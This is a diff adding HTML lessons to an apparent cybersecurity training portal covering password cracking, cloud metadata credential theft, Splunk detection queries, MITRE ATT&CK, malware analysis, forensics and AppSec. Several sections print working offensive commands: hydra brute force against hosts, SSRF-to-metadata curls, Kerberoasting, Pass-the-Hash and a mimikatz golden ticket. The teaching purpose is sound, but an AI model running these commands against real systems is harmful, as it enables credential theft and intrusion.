+    <!-- ===== PASSWORD ATTACKS ===== -->
+    <section id="password">
+      <h2>🔑 Password Attacks</h2>
+      <div class="lesson-block">
+        <div class="lesson-block__header">
+          <div class="lesson-block__title">hashcat, hydra, John the Ripper</div>
+          <button class="btn btn--outline btn--sm" data-lesson="cybersecurity-vapt:password">Mark Complete</button>
+        </div>
+        <pre><code># hashcat — GPU-accelerated hash cracking
+# Identify hash type
+hashid hash_value
+hashcat --identify hash_value
+
+# Attack modes
+hashcat -m 0 -a 0 hashes.txt rockyou.txt    # MD5, dictionary
+hashcat -m 1800 -a 0 hashes.txt rockyou.txt # sha512crypt ($6$)
+hashcat -m 1000 -a 0 hashes.txt rockyou.txt # NTLM (Windows)
+hashcat -m 3200 -a 0 hashes.txt rockyou.txt # bcrypt
+hashcat -m 22000 -a 0 handshake.hc22000 rockyou.txt # WPA2
+
+# With rules (mangling)
+hashcat -m 0 -a 0 hashes.txt rockyou.txt -r rules/best64.rule
+
+# Mask attack (brute force pattern)
+hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?d?d?d?d  # Upperlowerlowerlower1234
+
+# hydra — online brute force
+hydra -l admin -P rockyou.txt ssh://192.168.1.50
+hydra -l admin -P rockyou.txt http-post-form \
+  "/login:username=^USER^&password=^PASS^:Invalid credentials"
+hydra -L users.txt -P passwords.txt ftp://192.168.1.50
+hydra -l admin -P rockyou.txt rdp://192.168.1.50
+
+# John the Ripper
+john --format=sha256crypt hashes.txt --wordlist=rockyou.txt
+john --format=bcrypt hashes.txt --wordlist=rockyou.txt
+john --show hashes.txt  # show cracked
+
+# Extract hashes from files
+zip2john protected.zip > zip.hash
+rar2john protected.rar > rar.hash
+pdf2john protected.pdf > pdf.hash
+ssh2john id_rsa > ssh.hash
+john zip.hash --wordlist=rockyou.txt</code></pre>
+      </div>
+    </section>
+
+    <!-- ===== CLOUD SECURITY ===== -->
+    <section id="cloud-sec">
+      <h2>☁️ Cloud Security</h2>
+      <div class="lesson-block">
+        <div class="lesson-block__header">
+          <div class="lesson-block__title">AWS/Azure/GCP Security Misconfigs</div>
+          <button class="btn btn--outline btn--sm" data-lesson="cybersecurity-vapt:cloud-sec">Mark Complete</button>
+        </div>
+        <h3>AWS Security Checks</h3>
+        <pre><code># Misconfigured S3 bucket (public read)
+aws s3 ls s3://target-bucket --no-sign-request  # check if public
+aws s3 cp s3://target-bucket/secret.env .  --no-sign-request
+
+# SSRF to metadata endpoint (AWS)
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# Returns temporary credentials!
+
+# Enumerate permissions with stolen creds
+aws sts get-caller-identity                  # who am I?
+aws iam list-attached-user-policies --user-name hacked-user
+aws iam list-groups-for-user --user-name hacked-user
+python3 enumerate-iam.py --access-key AKIA... --secret-key ...  # bruteforce
+
+# AWS Cloud security tools
+prowler aws --compliance pci_3.2.1           # compliance audit
+ScoutSuite --provider aws                    # multi-cloud audit
+cloudmapper analyze --account TARGET         # visualize account
+
+# GCP metadata
+curl -H "Metadata-Flavor: Google" \
+  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Azure IMDS (Instance Metadata Service)
+curl -H Metadata:true \
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"</code></pre>
+      </div>
+    </section>
+
+    <!-- ===== SOC / SIEM ===== -->
+    <section id="soc">
+      <h2>🛡️ SOC & SIEM</h2>
+      <div class="lesson-block">
+        <div class="lesson-block__header">
+          <div class="lesson-block__title">Incident Response, Splunk SPL</div>
+          <button class="btn btn--outline btn--sm" data-lesson="cybersecurity-vapt:soc">Mark Complete</button>
+        </div>
+        <h3>Incident Response Process (NIST SP 800-61)</h3>
+        <ol>
+          <li><strong>Preparation</strong> — IR plan, playbooks, tools, training</li>
+          <li><strong>Detection & Analysis</strong> — SIEM alerts, IOC matching, triage</li>
+          <li><strong>Containment</strong> — Short-term (isolate host), long-term (patch/change creds)</li>
+          <li><strong>Eradication</strong> — Remove malware, close vulnerabilities</li>
+          <li><strong>Recovery</strong> — Restore systems, monitor for recurrence</li>
+          <li><strong>Post-Incident Activity</strong> — Lessons learned, improve controls</li>
+        </ol>
+
+        <h3>Splunk SPL Queries</h3>
+        <pre><code># Failed SSH logins (brute force detection)
+index=linux sourcetype=syslog "Failed password"
+| rex "Failed password for (?:invalid user )?(?P&lt;user&gt;\w+) from (?P&lt;src_ip&gt;[\d.]+)"
+| stats count by src_ip, user
+| where count > 10
+| sort -count
+
+# Top 10 source IPs by failed logins
+index=linux "Failed password"
+| stats count by src_ip | sort -count | head 10
+
+# Detect PowerShell execution
+index=windows EventCode=4688 (CommandLine="*powershell*" OR CommandLine="*cmd.exe*")
+| rex field=CommandLine "(?P&lt;cmdline&gt;.*)"
+| eval suspicious=if(match(cmdline,"(?i)(bypass|encoded|hidden|download|invoke-expression)"), "YES", "NO")
+| where suspicious="YES"
+| table _time, ComputerName, user, cmdline
+
+# New admin user created
+index=windows EventCode=4720 OR EventCode=4728
+| eval action=case(EventCode=4720, "Account Created", EventCode=4728, "Added to Admins")
+| table _time, ComputerName, SubjectUserName, TargetUserName, action</code></pre>
+      </div>
+    </section>
+
+    <!-- ===== MITRE ===== -->
+    <section id="mitre">
+      <h2>🗂️ MITRE ATT&CK & Kill Chain</h2>
+      <div class="lesson-block">
+        <div class="lesson-block__header">
+          <div class="lesson-block__title">Tactics, Techniques & Cyber Kill Chain</div>
+          <button class="btn btn--outline btn--sm" data-lesson="cybersecurity-vapt:mitre">Mark Complete</button>
+        </div>
+        <h3>Lockheed Martin Cyber Kill Chain</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Stage</th><th>Attacker Action</th><th>Defense</th></tr></thead>
+            <tbody>
+              <tr><td>1. Reconnaissance</td><td>OSINT, scanning, social engineering</td><td>Minimize public exposure, honeypots</td></tr>
+              <tr><td>2. Weaponization</td><td>Create malware, exploit payload</td><td>Threat intel, malware analysis</td></tr>
+              <tr><td>3. Delivery</td><td>Phishing email, USB, watering hole</td><td>Email filtering, user training, EDR</td></tr>
+              <tr><td>4. Exploitation</td><td>Exploit vulnerability to execute code</td><td>Patching, WAF, sandbox, least privilege</td></tr>
+              <tr><td>5. Installation</td><td>Persistence: registry keys, cron, service</td><td>Application control, file integrity monitoring</td></tr>
+              <tr><td>6. C2 (Command & Control)</td><td>Beaconing to attacker server</td><td>DNS filtering, egress filtering, NDR</td></tr>
+              <tr><td>7. Actions on Objective</td><td>Data exfiltration, ransomware, lateral movement</td><td>DLP, network segmentation, UEBA</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>MITRE ATT&CK Tactics (Enterprise)</h3>
+        <pre><code># 14 Tactics with example techniques
+TA0001: Initial Access      — T1566 Phishing, T1190 Exploit Public-Facing App
+TA0002: Execution           — T1059 Command/Scripting Interpreter (PowerShell, bash)
+TA0003: Persistence         — T1053 Scheduled Task, T1543 Create/Modify Service
+TA0004: Privilege Escalation— T1548 Sudo/Sudo Caching, T1055 Process Injection
+TA0005: Defense Evasion     — T1027 Obfuscated Files, T1070 Indicator Removal
+TA0006: Credential Access   — T1003 Credential Dumping, T1110 Brute Force
+TA0007: Discovery           — T1082 System Info, T1046 Network Service Scan
+TA0008: Lateral Movement    — T1021 Remote Services (SSH, RDP, SMB)
+TA0009: Collection          — T1005 Data from Local System, T1056 Input Capture
+TA0010: Exfiltration        — T1048 Exfil over Alt Protocol, T1567 Exfil to Cloud
+TA0011: C2                  — T1071 App Layer Protocol (HTTPS C2), T1095 Non-App C2
+TA0040: Impact              — T1486 Data Encrypted for Impact (Ransomware)
+
+# Use ATT&CK Navigator to build threat model for your environment</code></pre>
+      </div>
+    </section>
+
+    <!-- ===== LABS ===== -->
+    <section id="labs">
+      <h2>🧪 Labs & CTF Platforms</h2>
+      <div class="grid-2">
+        <div class="card card--glow"><h3>Lab 1: DVWA Setup</h3><p style="color:var(--text-dim)">Deploy Damn Vulnerable Web Application. Practice SQLi, XSS, CSRF, File Upload attacks.</p><span class="badge badge--success">Beginner</span></div>
+        <div class="card card--glow"><h3>Lab 2: Metasploitable</h3><p style="color:var(--text-dim)">Scan Metasploitable 2/3 with Nmap. Exploit services: vsftpd, UnrealIRCd, Samba.</p><span class="badge badge--warning">Intermediate</span></div>
+        <div class="card card--glow"><h3>Lab 3: Active Directory Attack</h3><p style="color:var(--text-dim)">Set up AD lab. Practice Kerberoasting, AS-REP Roasting, Pass-the-Hash, DCSync.</p><span class="badge badge--danger">Advanced</span></div>
+        <div class="card card--glow"><h3>Lab 4: Web App VAPT</h3><p style="color:var(--text-dim)">Full pentest of OWASP Juice Shop. Document findings in professional report format.</p><span class="badge badge--warning">Intermediate</span></div>
+        <div class="card card--glow"><h3>TryHackMe</h3><p style="color:var(--text-dim)">Guided rooms. Beginner to advanced. OSCP prep. Browser-based (no setup needed).</p><span class="badge badge--success">All Levels</span></div>
+        <div class="card card--glow"><h3>HackTheBox</h3><p style="color:var(--text-dim)">Real machines. Challenge-based. Pro Labs for enterprise environment simulation.</p><span class="badge badge--danger">Intermediate+</span></div>
+      </div>
+    </section>
+
+    <!-- ===== INTERVIEW ===== -->
+    <section id="interview">
+      <h2>🎯 Cybersecurity Interview Questions</h2>
+      <div class="lesson-block">
+        <div class="lesson-block__header">
+          <div class="lesson-block__title">Top 15 Security Interview Q&A</div>
+          <button class="btn btn--outline btn--sm" data-lesson="cybersecurity-vapt:interview">Mark Complete</button>
+        </div>
+
+        <h3>Q1: Difference between vulnerability, threat, and risk?</h3>
+        <p><strong>Vulnerability:</strong> Weakness in a system (unpatched software, misconfiguration).<br><strong>Threat:</strong> Potential actor/event that could exploit vulnerability (hacker, malware, fire).<br><strong>Risk:</strong> Risk = Threat × Vulnerability × Impact. It's the potential for harm.</p>
+
+        <h3>Q2: What is the difference between symmetric and asymmetric encryption?</h3>
+        <p><strong>Symmetric:</strong> Same key for encrypt/decrypt (AES). Fast, great for large data. Key distribution problem.<br><strong>Asymmetric:</strong> Public key encrypts, private key decrypts (RSA, ECDSA). Solves key distribution. Slow. Used in TLS handshake to exchange symmetric session key.</p>
+
+        <h3>Q3: How does a man-in-the-middle attack work?</h3>
+        <p>Attacker positions between client and server. Intercepts traffic by ARP poisoning (LAN), DNS spoofing, or rogue hotspot. Relays and modifies traffic. Prevented by: TLS (certificate validation), HSTS, certificate pinning, DNSSEC.</p>
+
+        <h3>Q4: What is a SQL injection and how do you prevent it?</h3>
+        <p>SQL injection: unsanitized user input changes SQL query logic. Prevention: parameterized queries/prepared statements (never string concatenation), input validation, WAF, least-privilege DB user (no DROP/CREATE), stored procedures.</p>
+
+        <h3>Q5: Explain the difference between IDS and IPS</h3>
+        <p><strong>IDS (Intrusion Detection System):</strong> Monitors traffic, generates alerts, PASSIVE — cannot block.<br><strong>IPS (Intrusion Prevention System):</strong> Inline deployment, ACTIVE — can block malicious traffic in real-time. IPS is effectively an IDS that can act.</p>
+
+        <h3>Q6: What is CSRF and how is it prevented?</h3>
+        <p>CSRF forces authenticated user's browser to make unintended requests (e.g., transfer funds). Prevention: CSRF tokens (per-form random value verified server-side), SameSite cookie attribute (Strict/Lax), verify Origin/Referer header, custom headers (X-Requested-With: XMLHttpRequest).</p>
+
+        <h3>Q7: What steps would you take if you discovered a security breach?</h3>
+        <p>Follow IR process: 1) Contain (isolate affected systems — disconnect from network, do NOT shut down if forensics needed), 2) Preserve evidence (memory dump, logs), 3) Notify (security team, legal, management), 4) Eradicate (remove malware, close entry point), 5) Recover (restore from clean backup), 6) Post-incident (root cause analysis, improve controls).</p>
+
+        <h3>Q8: What is the difference between black box, white box, and grey box testing?</h3>
+        <p><strong>Black box:</strong> No prior knowledge of target. Simulates external attacker. Realistic but may miss edge cases.<br><strong>White box:</strong> Full access (source code, architecture, creds). Most thorough. Less realistic.<br><strong>Grey box:</strong> Partial info (credentials, API docs, architecture diagram). Balances depth and realism.</p>
+      </div>
+    </section>
+
+    <!-- ===== CERTS ===== -->
+    <section id="certs">
+      <h2>🏆 Cybersecurity Certifications</h2>
+      <div class="grid-2">
+        <div class="card card--glow">
+          <h3>CompTIA Security+</h3>
+          <p style="color:var(--text-dim)">Vendor-neutral baseline security cert. DoD 8570 approved. Great first cert.</p>
+          <p><strong>Exam:</strong> SY0-701 | <strong>Questions:</strong> 90 | <strong>Pass:</strong> 750/900 | <strong>Cost:</strong> $404</p>
+          <span class="badge badge--success">Beginner</span>
+        </div>
+        <div class="card card--glow">
+          <h3>CEH — Certified Ethical Hacker</h3>
+          <p style="color:var(--text-dim)">EC-Council. 20 hacking modules. Exam + optional practical (CEH Master).</p>
+          <p><strong>Exam:</strong> 312-50 | <strong>Questions:</strong> 125 | <strong>Pass:</strong> 70% | <strong>Cost:</strong> $950</p>
+          <span class="badge badge--warning">Intermediate</span>
+        </div>
+        <div class="card card--glow">
+          <h3>eJPT — eLearnSecurity Junior Penetration Tester</h3>
+          <p style="color:var(--text-dim)">Practical lab-based exam. Great OSCP preparation. No prerequisites.</p>
+          <p><strong>Exam:</strong> 100% hands-on | <strong>Duration:</strong> 48 hours | <strong>Cost:</strong> $200</p>
+          <span class="badge badge--warning">Intermediate</span>
+        </div>
+        <div class="card card--glow">
+          <h3>OSCP — Offensive Security Certified Professional</h3>
+          <p style="color:var(--text-dim)">Gold standard for pentesters. 24-hour hands-on exam. Highly respected.</p>
+          <p><strong>Exam:</strong> 24hr pwn + 24hr report | <strong>Cost:</strong> $1499 (with 90-day lab)</p>
+          <span class="badge badge--danger">Advanced</span>
+        </div>
+      </div>
+    </section>
+
+    <!-- ===== MALWARE ANALYSIS ===== -->
+    <section id="malware-analysis">
+      <h2>🦠 Malware Analysis &amp; Reverse Engineering</h2>
+      <div class="lesson-block">
+        <div class="lesson-block__header">
+          <div class="lesson-block__title">Static, Dynamic &amp; Memory Forensics</div>
+          <button class="btn btn--outline btn--sm" data-lesson="cybersecurity-vapt:malware-analysis">Mark Complete</button>
+        </div>
+
+        <h3>Malware Classification</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Type</th><th>Example</th><th>Behavior</th><th>Detection</th></tr></thead>
+            <tbody>
+              <tr><td>Virus</td><td>ILOVEYOU</td><td>Self-replicates into host files</td><td>Signature + heuristic AV</td></tr>
+              <tr><td>Worm</td><td>WannaCry</td><td>Self-propagates via network</td><td>Network anomaly detection</td></tr>
+              <tr><td>Trojan</td><td>RAT (njRAT)</td><td>Masquerades as legit software</td><td>Behavioral analysis</td></tr>
+              <tr><td>Ransomware</td><td>LockBit 3.0</td><td>Encrypts files, demands ransom</td><td>File entropy monitoring</td></tr>
+              <tr><td>Rootkit</td><td>Necurs</td><td>Hides in kernel/bootloader</td><td>Memory forensics, UEFI scan</td></tr>
+              <tr><td>Fileless</td><td>PowerShell Empire</td><td>Lives only in memory/registry</td><td>EDR telemetry</td></tr>
+              <tr><td>Keylogger</td><td>HawkEye</td><td>Captures keystrokes</td><td>API hooking detection</td></tr>
+              <tr><td>Spyware</td><td>FinFisher</td><td>Exfiltrates data covertly</td><td>Network DLP</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Static Analysis Workflow</h3>
+        <pre><code># 1. File identification (NEVER execute unknown malware directly)
+file malware.exe
+md5sum malware.exe &amp;&amp; sha256sum malware.exe
+
+# 2. String extraction
+strings -a malware.exe | grep -E "(http|cmd|powershell|registry|CreateProcess)"
+floss malware.exe  # FLOSS decodes obfuscated strings
+
+# 3. PE header analysis (Windows executables)
+pecheck malware.exe          # sections, imports, exports
+pestudio malware.exe         # GUI: imports, strings, indicators
+
+# 4. Import table (what Windows APIs does it call?)
+# Suspicious imports:
+# CreateRemoteThread    → process injection
+# VirtualAllocEx        → shellcode injection
+# WriteProcessMemory    → code injection
+# RegSetValueEx         → persistence via registry
+# WinExec / CreateProcess → execution
+# InternetOpenUrl       → C2 communication
+
+# 5. Entropy analysis (high entropy = packed/encrypted)
+python3 -c "
+import math, sys
+data = open(sys.argv[1],'rb').read()
+freq = [data.count(bytes([i]))/len(data) for i in range(256)]
+H = -sum(p*math.log2(p) for p in freq if p)
+print(f'Entropy: {H:.2f}/8.0')  # &gt;7.2 = likely packed
+" malware.exe</code></pre>
+
+        <h3>Dynamic Analysis (Sandbox)</h3>
+        <pre><code># Cuckoo Sandbox — automated behavioral analysis
+cuckoo submit --timeout 120 malware.exe
+# Reports: network connections, file operations, registry changes, API calls, screenshots
+
+# Manual dynamic analysis tools:
+# Process Monitor (procmon) — file/registry/network activity per PID
+# Wireshark           — capture C2 traffic, extract IOCs
+# Regshot             — snapshot registry before/after execution
+# API Monitor         — hook and log Windows API calls
+# x64dbg / OllyDbg   — interactive debugger, step through execution
+
+# Network indicators to extract:
+# C2 IP/domain, User-Agent strings, URI patterns
+# DNS queries, TLS certificate fingerprints (JA3/JA3S)</code></pre>
+
+        <h3>Memory Forensics with Volatility 3</h3>
+        <pre><code># Capture memory: winpmem, DumpIt, LiME (Linux)
+
+# Volatility 3 analysis
+vol -f memory.dmp windows.info           # OS version, architecture
+vol -f memory.dmp windows.pslist         # running processes
+vol -f memory.dmp windows.pstree        # process parent-child tree
+vol -f memory.dmp windows.cmdline       # command-line args per process
+vol -f memory.dmp windows.netstat       # network connections
+vol -f memory.dmp windows.malfind      # injected code (VAD anomalies)
+vol -f memory.dmp windows.dlllist --pid 1234  # DLLs loaded by PID
+vol -f memory.dmp windows.dumpfiles --pid 1234 # extract process memory
+
+# Red flags: process with no parent, svchost.exe not from system32,
+# lsass.exe with unexpected child processes, hollowed process (VAD vs disk mismatch)</code></pre>
+
+        <h3>IOC Extraction &amp; Threat Intelligence</h3>
+        <ul>
+          <li>Extract IOCs (Indicators of Compromise): IPs, domains, hashes, file paths, registry keys, mutexes, User-Agent strings</li>
+          <li>Share via MISP, OpenIOC, STIX/TAXII formats</li>
+          <li>Enrich with VirusTotal, OTX AlienVault, Shodan, URLScan.io, AbuseIPDB</li>
+          <li>YARA rules — write signatures matching strings/byte patterns to hunt across endpoints</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- ===== THREAT HUNTING ===== -->
+    <section id="threat-hunting">
+      <h2>🎯 Threat Hunting &amp; Digital Forensics</h2>
+      <div class="lesson-block">
+        <div class="lesson-block__header">
+          <div class="lesson-block__title">Proactive Detection &amp; Incident Investigation</div>
+          <button class="btn btn--outline btn--sm" data-lesson="cybersecurity-vapt:threat-hunting">Mark Complete</button>
+        </div>
+
+        <h3>Threat Hunting Methodology</h3>
+        <ul>
+          <li><strong>Hypothesis-driven:</strong> "Attackers may have used living-off-the-land (LOLBins) binaries" → hunt for certutil, mshta, regsvr32 spawning unusual child processes</li>
+          <li><strong>Intel-driven:</strong> new CVE → hunt for exploitation patterns in logs</li>
+          <li><strong>Anomaly-driven:</strong> baseline normal behavior → alert on deviations (unusual logon hours, rare process-parent combos)</li>
+        </ul>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Hypothesis</th><th>Data Source</th><th>Hunt Query</th><th>Tool</th></tr></thead>
+            <tbody>
+              <tr><td>LOLBin abuse</td><td>Sysmon Event 1</td><td>ParentImage=powershell.exe AND Image=*mshta.exe</td><td>Splunk / Elastic</td></tr>
+              <tr><td>Lateral movement</td><td>4624/4625 Event Log</td><td>Multiple failed logons + success from same source</td><td>SIEM</td></tr>
+              <tr><td>Data exfiltration</td><td>DNS logs</td><td>High-volume DNS queries to single external domain</td><td>Zeek/Suricata</td></tr>
+              <tr><td>Persistence</td><td>Sysmon Event 13</td><td>TargetObject=*\CurrentVersion\Run*</td><td>Elastic SIEM</td></tr>
+              <tr><td>Process injection</td><td>Sysmon Event 8</td><td>SourceImage≠TargetImage, common: svchost</td><td>Splunk</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>DFIR — Digital Forensics &amp; Incident Response</h3>
+        <pre><code># Evidence collection order (volatility: RAM &gt; swap &gt; disk)
+# 1. Memory capture (before shutdown — RAM is volatile)
+winpmem_mini.exe memory.raw
+
+# 2. Live system triage
+netstat -anob         # active connections with PID
+tasklist /v           # running processes
+wmic process list full &gt; processes.txt
+reg export HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run persistence.reg
+
+# 3. Disk image (write-blocker required for legal admissibility)
+dd if=/dev/sda of=/evidence/disk.img bs=4M status=progress
+sha256sum /evidence/disk.img &gt; disk.img.sha256
+
+# 4. Timeline creation
+log2timeline.py plaso.db /evidence/disk.img
+psort.py -o l2tcsv plaso.db "date &gt; '2024-01-01'" &gt; timeline.csv
+
+# 5. Windows artifact locations
+# - Prefetch:   C:\Windows\Prefetch\ (execution evidence)
+# - Shimcache:  HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache
+# - Amcache:    C:\Windows\AppCompat\Programs\Amcache.hve
+# - NTUSER.DAT: recent files, typed URLs, shellbags
+# - Event logs: C:\Windows\System32\winevt\Logs\
+# - $MFT:       Master File Table — all files ever created</code></pre>
+
+        <h3>Linux Forensics Artifacts</h3>
+        <pre><code># Persistence locations to check
+cat /etc/crontab &amp;&amp; crontab -l
+ls -la /etc/cron.*
+cat /etc/rc.local
+ls -la /etc/init.d/ /etc/systemd/system/
+
+# Execution artifacts
+cat ~/.bash_history
+last -F              # login history
+lastb                # failed logins
+ausearch -m execve   # auditd execution log
+
+# Network connections
+ss -tulpan
+cat /proc/net/tcp    # raw connections
+
+# Hidden files / backdoors
+find / -name ".*" -type f 2&gt;/dev/null | head -50
+find / -perm -4000 -type f 2&gt;/dev/null  # SUID binaries
+find /tmp /var/tmp -executable 2&gt;/dev/null
+
+# Rootkit check
+rkhunter --check
+chkrootkit</code></pre>
+
+        <h3>Chain of Custody &amp; Evidence Handling</h3>
+        <ul>
+          <li>Document: who collected, when, where, what hash, chain of custody form</li>
+          <li>Write-block all storage media before imaging</li>
+          <li>Use forensically sound tools (FTK, Autopsy, Sleuth Kit)</li>
+          <li>Never perform analysis on original evidence — always work from verified copy</li>
+          <li>Maintain hash verification at every transfer step</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- ===== ZERO TRUST ===== -->
+    <section id="zero-trust">
+      <h2>🛡️ Zero Trust Architecture &amp; IAM</h2>
+      <div class="lesson-block">
+        <div class="lesson-block__header">
+          <div class="lesson-block__title">Never Trust, Always Verify</div>
+          <button class="btn btn--outline btn--sm" data-lesson="cybersecurity-vapt:zero-trust">Mark Complete</button>
+        </div>
+
+        <h3>Zero Trust Principles (NIST SP 800-207)</h3>
+        <ul>
+          <li>All resources treated as external — no implicit trust based on network location</li>
+          <li>Least privilege per-request — access granted to specific resource for specific session only</li>
+          <li>Continuous verification — re-authenticate, re-authorize for every transaction</li>
+          <li>Assume breach — minimize blast radius, micro-segment everything</li>
+          <li>Device health check — only allow compliant, managed devices</li>
+        </ul>
+
+        <h3>ZTA Implementation Pillars</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Pillar</th><th>Controls</th><th>Tools</th></tr></thead>
+            <tbody>
+              <tr><td>Identity</td><td>MFA, passwordless, just-in-time access</td><td>Azure AD, Okta, Duo</td></tr>
+              <tr><td>Device</td><td>MDM enrollment, compliance check, certificate auth</td><td>Intune, Jamf, ZTNA</td></tr>
+              <tr><td>Network</td><td>Micro-segmentation, encrypted east-west, deny-all default</td><td>NSX, Illumio, Calico</td></tr>
+              <tr><td>Application</td><td>mTLS, API gateway, WAF, ZTNA</td><td>Istio, Kong, Cloudflare Access</td></tr>
+              <tr><td>Data</td><td>DLP, encryption at rest/transit, CASB</td><td>Forcepoint, Netskope, AWS Macie</td></tr>
+              <tr><td>Visibility</td><td>SIEM, UEBA, full packet capture</td><td>Splunk, Elastic, Darktrace</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Identity Attacks &amp; Defenses</h3>
+        <pre><code># Kerberoasting — attack on service accounts
+# Attacker requests TGS for SPN, cracks offline
+impacket-GetUserSPNs domain.local/user:pass -dc-ip 10.0.0.1 -request
+hashcat -m 13100 hashes.txt rockyou.txt  # crack RC4 TGS
+# Defense: use managed service accounts (gMSA), 30-char random passwords
+
+# AS-REP Roasting — accounts without pre-auth required
+impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass
+# Defense: require Kerberos pre-authentication for all accounts
+
+# Pass-the-Hash (PtH)
+impacket-psexec Administrator@10.0.0.5 -hashes :ntlm_hash
+# Defense: disable NTLM, enable Protected Users group, Credential Guard
+
+# Golden Ticket — compromise krbtgt account
+mimikatz "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-... /krbtgt:hash /ticket:golden.kirbi"
+# Defense: rotate krbtgt password twice, monitor for anomalous TGT lifetimes</code></pre>
+
+        <h3>PAM — Privileged Access Management</h3>
+        <ul>
+          <li><strong>Just-in-time (JIT) access:</strong> elevate privileges only when needed, auto-expire</li>
+          <li><strong>Privileged access workstations (PAW):</strong> dedicated hardened machines for admin tasks</li>
+          <li><strong>Session recording:</strong> full video/keylog of all privileged sessions</li>
+          <li><strong>Vault credentials:</strong> all service account passwords stored in Vault/CyberArk, never in code</li>
+          <li><strong>Break-glass accounts:</strong> emergency access with full audit trail</li>
+        </ul>
+      </div>
+    </section>
+
+    <!-- ===== APPSEC ===== -->
+    <section id="appsec">
+      <h2>🔬 Application Security Testing (SAST/DAST/IAST)</h2>
+      <div class="lesson-block">
+        <div class="lesson-block__header">
+          <div class="lesson-block__title">Shift-Left Security in the SDLC</div>
+          <button class="btn btn--outline btn--sm" data-lesson="cybersecurity-vapt:appsec">Mark Complete</button>
+        </div>
+
+        <h3>Security Testing Types Comparison</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Type</th><th>When</th><th>How</th><th>Tools</th><th>Coverage</th></tr></thead>
+            <tbody>
+              <tr><td>SAST</td><td>Pre-commit / CI</td><td>Analyzes source code without running</td><td>Semgrep, CodeQL, SonarQube</td><td>Logic flaws, hardcoded secrets, injection patterns</td></tr>
+              <tr><td>SCA</td><td>CI</td><td>Scans dependencies for known CVEs</td><td>Snyk, Dependabot, OWASP DC</td><td>Supply chain, transitive dependencies</td></tr>
+              <tr><td>DAST</td><td>Staging/prod</td><td>Sends payloads to running app</td><td>OWASP ZAP, Burp Suite Pro</td><td>XSS, SQLi, auth issues, config issues</td></tr>
+              <tr><td>IAST</td><td>Runtime in test</td><td>Agent inside app during testing</td><td>Contrast Security, Seeker</td><td>Real execution paths, low false positives</td></tr>
+              <tr><td>Pentest</td><td>Pre-release</td><td>Manual + automated by humans</td><td>Burp, Metasploit, custom</td><td>Business logic, chained vulnerabilities</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Semgrep SAST Rules</h3>
+        <pre><code># Custom Semgrep rule: detect hardcoded AWS keys
+rules:
+  - id: hardcoded-aws-key
+    pattern: |
+      $KEY = "AKIA..."
+    message: Hardcoded AWS access key detected — use IAM roles or Secrets Manager
+    severity: ERROR
+    languages: [python, javascript, go, java]
+
+  - id: sql-injection-format-string
+    pattern: |
+      $DB.execute("SELECT ... " + $USER_INPUT)
+    message: SQL injection via string concatenation — use parameterized queries
+    severity: ERROR
+    languages: [python]
+
+  - id: insecure-deserialization
+    pattern: |
+      pickle.loads($DATA)
+    message: Unsafe deserialization — never unpickle untrusted data
+    severity: WARNING
+    languages: [python]</code></pre>
+
+        <h3>OWASP ZAP Automation (DAST)</h3>
+        <pre><code># Baseline scan (passive, safe for prod)
+docker run -t owasp/zap2docker-stable zap-baseline.py \
+  -t https://myapp.example.com \
+  -r zap-report.html
+
+# Full scan (active — use only on staging/test)
+docker run -t owasp/zap2docker-stable zap-full-scan.py \
+  -t https://staging.example.com \
+  -r full-report.html \
+  -I  # do not fail on warnings
+
+# API scan (OpenAPI/Swagger)
+docker run -t owasp/zap2docker-stable zap-api-scan.py \
+  -t https://api.example.com/openapi.json \
+  -f openapi \
+  -r api-report.html</code></pre>
+
+        <h3>Secrets Detection in CI</h3>
+        <pre><code># GitLeaks in GitHub Actions
+- name: Detect secrets
+  uses: gitleaks/gitleaks-action@v2
+  env:
+    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+# Trufflehog — scans git history
+trufflehog git https://github.com/org/repo --only-verified
+
+# Pre-commit hook with detect-secrets
+pip install detect-secrets
+detect-secrets scan &gt; .secrets.baseline
+detect-secrets audit .secrets.baseline</code></pre>
+
+        <h3>Security Champions Program</h3>
+        <ul>
+          <li>Embed a Security Champion in each dev squad — developer trained in secure coding</li>
+          <li>Threat model every new feature (STRIDE) before sprint starts</li>
+          <li>Security acceptance criteria in every user story: "given X input, SQL injection must not be possible"</li>
+          <li>Bug bounty program: HackerOne or Bugcrowd for external validation</li>
+        </ul>
+      </div>
+    </section>
+
+    <section id="quiz-section-wrapper">
+      <h2>🧠 Test Your Knowledge</h2>
+      <div id="quiz-section"></div>
+    </section>
+  </main>
+
+  <aside class="progress-panel">
+    <div class="progress-panel__title">Your Progress</div>
+    <div id="portal-progress-bars"></div>
+  </aside>
+</div>
+
+<div id="footer-placeholder"></div>
+
+<script src="../assets/js/store.js"></script>
+<script src="../assets/js/utils.js"></script>
+<script src="../assets/js/auth.js"></script>
+<script src="../assets/js/progress.js"></script>
+<script src="../assets/js/quiz.js"></script>
+<script src="../assets/js/search.js"></script>
+<script src="../assets/js/partials.js"></script>
+<script src="../assets/js/portal.js"></script>
+</body>
+</html>
